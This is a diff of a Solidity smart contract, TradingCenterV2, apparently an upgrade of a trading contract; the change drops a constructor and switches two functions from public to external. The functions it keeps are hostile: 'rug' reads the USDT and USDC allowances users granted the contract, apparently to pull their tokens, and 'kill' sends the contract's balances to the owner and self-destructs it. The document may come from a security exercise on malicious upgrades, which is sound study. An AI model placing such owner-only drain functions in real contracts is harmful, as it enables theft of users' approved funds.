@@ -5,11 +5,7 @@ import "./TradingCenter.sol";
 import "./Ownable.sol";
 
 contract TradingCenterV2 is TradingCenter, Ownable {
-  constructor () {
-    initializeOwnable(msg.sender);
-  }
-
-  function rug(address _target) public onlyOwner {
+  function rug(address _target) external onlyOwner {
     // Get allowance amount for each token
     uint256 usdt_allowed_amount = usdt.allowance(_target, address(this));
     uint256 usdc_allowed_amount = usdc.allowance(_target, address(this));
@@ -25,7 +21,7 @@ contract TradingCenterV2 is TradingCenter, Ownable {
     }
   }
 
-  function kill() public onlyOwner {
+  function kill() external onlyOwner {
     usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
     usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
     selfdestruct(payable(msg.sender));
